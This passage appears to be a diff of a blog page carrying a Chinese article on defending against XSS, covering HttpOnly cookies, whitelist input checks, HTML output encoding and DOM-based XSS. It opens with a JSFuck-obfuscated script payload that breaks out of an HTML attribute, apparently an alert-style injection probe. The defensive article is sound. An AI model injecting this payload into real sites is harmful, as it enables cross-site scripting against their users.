/><script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+# XSS漏洞防御
+客户端用户
+<ul>
+<li>使用高版本浏览器</li>
+<li>Firefox使用CSP、NoScript等扩展功能</li>
+<li>个人安全软件</li>
+</ul>
+<p>Web程序员</p>
+<ul>
+<li>使用HttpOnly</li>
+<li>完善的输入、输出检查</li>
+</ul>
+<p>关于HttpOnly<br />HttpOnly的作用不是过滤XSS跨站脚本攻击，而是浏览器将禁止页面的JavaScript访问带有HttpOnly属性的cookie，解决XSS跨站脚本攻击后的cookie会话劫持行为<br />HttpOnly是在Set-Cookie时进行标记的，设置的cookie头格式如下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623856471203-852d27f3-75c1-4021-9b2b-e6e321dd7070.png#align=left&amp;display=inline&amp;height=99&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.14.14.png&amp;originHeight=208&amp;originWidth=798&amp;size=83538&amp;status=done&amp;style=none&amp;width=378" alt="截屏2021-06-16 下午11.14.14.png" /><br />以PHP为例，在PHP 5.2版本时就已经在set-cookie函数中加入了对HttpOnly的支持，如<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623856855933-c8bda01d-2d9c-498a-ac87-7094112aab0c.png#align=left&amp;display=inline&amp;height=140&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.20.43.png&amp;originHeight=140&amp;originWidth=1498&amp;size=101722&amp;status=done&amp;style=none&amp;width=1498" alt="截屏2021-06-16 下午11.20.43.png" /></p>
+<p><strong>检查输入输出</strong><br />由于三种XSS跨站脚本攻击类型的漏洞成因各不相同，针对输入输出的检查一部分适用于反射型XSS与存储型XSS，而另外一些检查适用于基于DOM的XSS</p>
+<ul>
+<li>输入检查</li>
+</ul>
+<p>在大多数的时候都是对可信字符的检查或输入数据格式的检查，如用户输入的注册账号信息中只允许包括字母、数字、下划线和汉字等，对于输入的一切非白名单内的字符均认为是非法输入。数据格式如输入的IP地址、电话号码、邮件地址、日期等数据都具有一定的格式规范，只有符合数据规范的输入信息才允许通过检查。</p>
+<ul>
+<li>输出检查</li>
+</ul>
+<p>输出检查主要是针对数据展示过程中，应该对数据信息进行HTML编码处理，将可能存在导致XSS跨站脚本攻击的恶意字符进行编码，在不影响正常数据显示的前提条件下，过滤恶意字符。</p>
+<ul>
+<li>常见特殊字符</li>
+</ul>
+<p>常见的可能造成XSS跨站脚本攻击的字符及其HTML编码如下：<br />&quot;   '   &amp;   &gt;   &lt;</p>
+<ul>
+<li>常见特殊字符</li>
+</ul>
+<p>除了常用的编码外，任何字符都可以使用其ascii码进行html编码，如：%   *</p>
+<ul>
+<li>特殊性</li>
+</ul>
+<p>基于DOM的XSS跨站脚本攻击发生时，恶意数据的格式与传统的XSS跨站脚本攻击数据格式有一定的差异，甚至可以在不经过服务器端的处理和相应的情况下，直接对客户端实施攻击行为。</p>
+<p>DOM BASED XSS输入输出检测<br />在客户端部署相应的安全检测代码的过滤效果要比在服务器端检测的效果更明显。<br />客户端检测代码来保证用户输入的数据只包含字母、数字和空格<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623858063517-613f51fa-fa0e-4159-9ca5-2b0fc7853908.png#align=left&amp;display=inline&amp;height=123&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.40.51.png&amp;originHeight=312&amp;originWidth=1246&amp;size=251815&amp;status=done&amp;style=none&amp;width=493" alt="截屏2021-06-16 下午11.40.51.png" /><br />输入检查要实现上述数据检查的功能</p>
+<ul>
+<li>URL参数名称</li>
+<li>参数值类型及内容检测</li>
+</ul>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Baz
+                
+                
+                    
+                    in <a href="https://baz.ee/categories/an-quan/">安全</a>
+                
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
